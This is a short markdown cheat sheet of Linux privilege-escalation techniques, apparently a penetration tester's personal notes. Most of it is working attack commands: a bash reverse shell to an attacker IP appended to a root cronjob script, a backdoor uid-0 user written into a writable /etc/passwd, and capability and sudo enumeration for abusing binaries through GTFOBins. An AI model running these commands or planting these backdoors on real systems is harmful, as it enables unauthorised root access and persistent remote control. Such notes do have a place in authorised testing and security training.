## Linux PrivEsc

If we reckon we have a privileged users password, remember to try this even if login via SSH has failed, it may just be that the privileged user we have owned doesn't have SSH, but they can still authenticate locally:
```bash
su - root
```
### Abusing cronjobs
Search for cronjobs running as privileged users and see if we can't edit the file it runs:
```bash
grep "CRON" /var/log/syslog
```
If this comes up empty don't forget to check other cronjob enumeration commands as listed in `enumeration/linux.md#cronjobs`.

If we can edit then go ahead and pop a reverse shell in there:
```bash
echo "bash -c 'bash -i >& /dev/tcp/<OurIP>/4444 0>&1'" >> cronjobbin_all_day_long.sh
```

### /etc/passwd
If for some ridiculous reason `/etc/passwd` is writable by a user we can execute commands as, we have an easy path to privesc by inserting a new root user in there:
```bash
openssl passwd lolzage
```
```bash
echo "gigachad:<our hashed password>:0:0:root:/root:/bin/bash" >> /etc/passwd
```
```bash
su gigachad
```

### GTFOBins
If a binary has been delegated additional capabilities (particularly keeping an eye out for the `cap_setuid+ep` setting) we can find out via:
```bash
/usr/sbin/getcap -r / 2>/dev/null
```
Equally if our current user can run an application as `root` we can discover them via:
```bash
sudo -l
```
In both cases we can search for how we might go about abusing the relevant binary on https://gtfobins.github.io/. Nb. it is possible that `AppArmor` may cuck us for a privesc path we try. Do not be disheartened! `AppArmor` works via a series of profiles, just because one is present for one application, does not mean there is one present for all of them. Abuse every binary!